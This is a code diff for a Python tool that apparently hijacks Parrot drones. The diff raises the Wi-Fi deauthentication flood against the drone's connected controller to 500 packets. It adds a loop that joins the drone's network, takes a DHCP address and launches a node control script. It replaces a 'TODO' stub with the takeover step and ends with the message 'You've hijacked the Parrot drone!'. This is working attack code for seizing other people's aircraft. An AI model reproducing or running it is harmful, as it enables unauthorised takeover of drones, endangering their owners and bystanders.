@@ -18,8 +18,7 @@ debug_enabled = True
 monitor_with_airmon = False
 deauth_with_aireplay = False
 
-interface = "wlp0s20f0u1"
-interface2 = "wlp61s0"
+interface = "wlp0s20f0u2"
 phy_iface = "phy1"
 
 # Parrot owns the 90:03:B7 block of MACs and a few others
@@ -107,7 +106,7 @@ class Client:
 """ Define a sudo exec function. """
 def sudo(*args):
     command  = ' '.join(args)
-    command += ' ' + ("" if debug_enabled else ">>/dev/null")
+    command += ("" if debug_enabled else " >>/dev/null")
     try:
         if debug_enabled:
             print(symbols.DBG, "Running '" + command + "'")
@@ -120,13 +119,6 @@ def sudo(*args):
     except OSError as e:
         print("Execution failed:", e)
 
-
-
-""" Put device into a specific mode. """
-def switch_mode(mode):
-    sudo(ifconfig, interface, "down")
-    sudo(iwconfig, interface, "mode", mode)
-    sudo(ifconfig, interface, "up")
 
 
 """ Put device into managed mode. """
@@ -142,7 +134,9 @@ def switch2managed():
     else:
         sudo(ip_prog, "link set", interface, "down")
         sudo(iw_prog, interface, "del")
+
         interface = interface.replace("mon", "")
+        sudo(iw_prog, phy_iface, "interface add", interface, "type managed")
         sudo(ip_prog, "link set", interface, "up")
 
 
@@ -154,12 +148,17 @@ def switch2monitor():
         print(symbols.DBG, "Switching adapter to monitor mode")
 
     if monitor_with_airmon:
-        switch_mode("managed")
+        sudo(ifconfig, interface, "down")
+        sudo(iwconfig, interface, "mode", "managed")
+        sudo(ifconfig, interface, "up")
+
         sudo(airmon, "check kill")
         sudo(airmon, "start", interface)
         interface = interface + "mon"
     else:
         sudo(ip_prog, "link set", interface, "down")
+        sudo(iw_prog, interface, "del")
+
         interface = interface + "mon"
         sudo(iw_prog, phy_iface, "interface add", interface, "type monitor")
         sudo(ip_prog, "link set", interface, "up")
@@ -326,13 +325,13 @@ def deauth_client(client, ap):
 
         # Build packets: addr1=dst, addr2=src, addr3=bssid
         deauth_pkt = RadioTap() \
-                / Dot11(addr1=client.mac, addr2=ap.bssid, addr3=ap.bssid) \
-                / Dot11Deauth()
+                / Dot11(addr1=ap.bssid, addr2=client.mac, addr3=ap.bssid) \
+                / Dot11Deauth(reason=7)
 
         # Send packet
         switch2monitor()
         sudo("iw dev", interface, "set channel", str(ap.chan))
-        sendp(deauth_pkt, iface=interface, count=3, verbose=debug_enabled)
+        sendp(deauth_pkt, iface=interface, count=500, verbose=debug_enabled)
         switch2managed()
 
 
@@ -342,28 +341,20 @@ def parrot_control(ap):
 
     # Connect to drone ESSID
     print(symbols.INFO, "Connecting to drone", ap.short_str())
-    # sudo(iw_prog, "dev", interface, "connect", ap.ssid)
-    # sudo(ip_prog, "link set", interface, "up")
-
-    #sudo("./ar.sh")
-
-    # sudo("wpa_supplicant -i " + interface2 + " -c wpa.conf &")
-    # sudo("sleep 2")
-
-    sudo(ifconfig, interface2, "up")
-    sudo(iwconfig, interface2, "essid", ap.ssid)
-    #sudo(ip_prog, "link set", interface, "up")
-
+    sudo(iw_prog, "dev", interface, "connect", ap.ssid)
+    sudo("while [ \"$(", iw_prog, interface, "link)\" = \"Not connected.\" ]; do", iw_prog, interface, "connect", ap.ssid, "; sleep 0.1; done")
 
     # Acquire IP
     print(symbols.INFO, "Acquiring IP from drone")
     sudo(dhclient, "-r")
-    sudo(dhclient, "-v", interface2)
+    sudo(dhclient, "-v", interface)
 
     # Take control
     print(symbols.INFO, "Taking drone control")
-    #sudo(nodejs, controljs)
-    print_err("TODO")
+    sudo("cd ardrone-webflight ;", nodejs, controljs)
+
+    # Congrats user
+    print(symbols.INFO, "Well done! You've hijacked the Parrot drone! :)")
 
 
 """ Hacks a Parrot AP. """
